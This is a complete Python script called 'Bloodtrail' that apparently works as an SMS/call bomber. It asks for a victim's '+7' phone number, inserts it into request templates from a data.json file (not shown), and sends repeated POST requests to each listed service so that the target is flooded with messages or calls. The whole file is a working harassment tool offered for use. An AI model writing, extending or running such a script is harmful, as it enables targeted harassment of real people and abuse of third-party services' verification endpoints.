import requests
import json

__version__ = "1.3beta02"

with open("data.json", "r", encoding="utf-8") as f:
    json_data = json.load(f)


class Bloodtrail:
    def __init__(self, phone, data):
        self.phone = phone
        self.data = data

    @staticmethod
    def print_request_result(r_status_code, r_service_name):
        print(f"[{r_status_code}] - {r_service_name}.")

    def format_data_in_service(self):
        for i in self.data["services"]:
            for k, v in self.data["services"][i]["data"].items():
                if "%PHONE%" in v:
                    v = v.replace("%PHONE%", self.phone[int(self.data["services"][i]["phone_f"]):])
                    self.data["services"][i]["data"][k] = v

    def send_requests(self, repeats=1):
        for i in range(repeats):
            for s in self.data["services"]:
                r_type = self.data["services"][s]["data_type"]
                if r_type == "json":
                    r = (requests.post(url=self.data["services"][s]["url"],
                                       json=self.data["services"][s]["data"]))
                else:
                    r = (requests.post(url=self.data["services"][s]["url"],
                                       data=self.data["services"][s]["data"]))
                self.print_request_result(r.status_code, s)


if __name__ == '__main__':
    script = Bloodtrail(input(f"BLOODTRAIL v{__version__}\ntarget number (+7XXXXXXXXXX): "), json_data)
    script.format_data_in_service()
    script.send_requests(int(input("repeats count: ")))
